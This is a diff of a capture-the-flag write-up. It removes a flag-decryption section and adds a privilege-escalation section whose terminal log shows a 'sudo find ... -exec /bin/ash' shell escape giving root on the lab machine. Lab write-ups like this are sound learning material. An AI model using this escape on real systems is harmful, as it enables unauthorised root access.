@@ -151,46 +151,60 @@ Now i visit the "passwd" file in which I tried all other user with same credenti
 
 <kbd>![alt text](images/47.png)</kbd>
 
-```
-22222222222222222222222222222222222222222222222222222222222222222222222222222222
-```
-
-<kbd>![alt text](test/26.png)</kbd>
-
-Still, the flag was encrypted !!!
-
-<kbd>![alt text](test/27.png)</kbd>
-
+listing the directory files for flag.
 
 ```
-After some random changes in file I found that something was wrong in that line:
-"c = (p - (k[i % strlen(k)] ^ t) - i*i) & 0xff;"
-
-So I changed the "-" value to "+" So the code would work perfectly.
-c = (p + (k[i % strlen(k)] ^ t) + i*i) & 0xff;
+NSCTF{ATTR_TATTRA_SARVATRA}
 ```
 
-<kbd>![alt text](test/28.png)</kbd>
+<kbd>![alt text](images/48.png)</kbd>
 
 
-Still somewhere went wrong!!
-
-A few minutes spending on reading the other flags hint !!! and suddenly I remembered the key "use_chandramauli_whenever_you_want" and I changed the decryption key from "whenever_you_want!" to "chandramauli".
-
-<kbd>![alt text](test/29.png)</kbd>
 
 
-I recompiled and run code & Got Final Flag !!!
+## Fifth Flag
 
-```nsctf "!n_m3m0ry_0f_+0ny_5+@rK"```
+<kbd>![alt text](images/60.png)</kbd>
+
+Task is about Priviledge Escalation so first I have to look for simple methods.
+
+<kbd>![alt text](images/61.png)</kbd>
+
+Interesting, I can only use find file command as a super user.
+So, I research on web about the "find" command to got super user priviledge on web.
+
+<kbd>![alt text](images/69.png)</kbd>
+
+> & Finally found something useful on "https://www.andreafortuna.org/2018/05/16/exploiting-sudo-for-linux-privilege-escalation/" Domain.
+
+<kbd>![alt text](images/68.png)</kbd>
+
+I have run some commands to see the possibilities. Below is the result.
+```
+localhost:/home/asur$ sudo find . -exec /bin/bash \;
+find: /bin/bash: No such file or directory
+find: /bin/bash: No such file or directory
+find: /bin/bash: No such file or directory
+localhost:/home/asur$ sudo find ../asur/.flag.txt  -exec /bin/bash \;
+find: /bin/bash: No such file or directory
+localhost:/home/asur$ sudo find ../asur/.flag.txt  -exec /bin/ash  \;
+localhost:/home/asur# 
+```
+From that I sure that, This will work.
+
+<kbd>![alt text](images/66.png)</kbd>
+
+Gotcha !!!
+```NSCTF{5amanya_Manushya_Ka_5imit_Gyan_Use_Apne_5e_Pare_Dekhne_Nahi_D3t4}```
 
 
-<kbd>![alt text](test/30.png)</kbd>
+
+
 
 
 ## Conclusion
 
-Overall, this CTF was unique for me because I learned about FTP, cryptography, and scripting.  Also, playing this was fun and I appreciate the efforts of the team.
+Overall, this CTF was unique for me because I learned about Priviledge Escalation, cryptography, and Stegniography.  Also, playing this was fun and I appreciate the efforts of the team.
 
 
 #
